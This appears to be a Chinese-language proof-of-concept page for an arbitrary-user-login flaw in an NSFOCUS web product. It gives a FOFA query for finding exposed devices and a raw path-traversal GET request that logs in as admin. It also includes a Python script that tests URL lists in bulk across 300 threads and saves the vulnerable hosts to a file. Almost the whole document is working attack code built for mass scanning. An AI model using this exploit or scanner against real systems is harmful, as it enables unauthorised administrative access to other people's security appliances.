### fofa

```markdown
body="'/needUsbkey.php?username='"
```

### payload

```markdown
GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
```

### 命令

```markdown
python3 文件名.py -f url.txt   # 批量测试url
python3 文件名.py -u url		# 单个测试url
```

### poc

```python
import requests,argparse,sys   				 # 导入requests、argparse、sys模块
from multiprocessing.dummy import Pool       # 多线程
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'  # 绿色字体
RESET = '\033[0m'   # 重置字体颜色
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """
	
██╗  ██╗██╗   ██╗██╗     ██╗     ███████╗███████╗███████╗       ██████╗  █████╗ ████████╗
██║  ██║██║   ██║██║     ██║     ██╔════╝██╔════╝██╔════╝      ██╔═══██╗██╔══██╗╚══██╔══╝
███████║██║   ██║██║     ██║     █████╗  ███████╗███████╗█████╗██║   ██║███████║   ██║   
██╔══██║██║   ██║██║     ██║     ██╔══╝  ╚════██║╚════██║╚════╝██║   ██║██╔══██║   ██║   
██║  ██║╚██████╔╝███████╗███████╗███████╗███████║███████║      ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝       ╚═════╝ ╚═╝  ╚═╝   ╚═╝   

																data: 2024-09-06                                                  
																version: 1.0.0
																author: hulless-oat
	"""
	print(banner)
def poc(target):
	payload = "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
	url = target + payload
	headers={
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
		"Accept-Encoding": "gzip, deflate",
		"Connection": "close"
	}	

	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.get(url=url,headers=headers,verify=False)
		if res.status_code == 200:
			if res1.status_code == 200 and "status" in res1.text:
				print(f"{GREEN}[+]该url存在任意用户登录漏洞：{target}\n{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在任意用户登录漏洞")
		else:
			print(f"该url连接失败")
	except:
		print(f"[*]该url出现错误")

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")

if __name__ == "__main__":
	main()
```

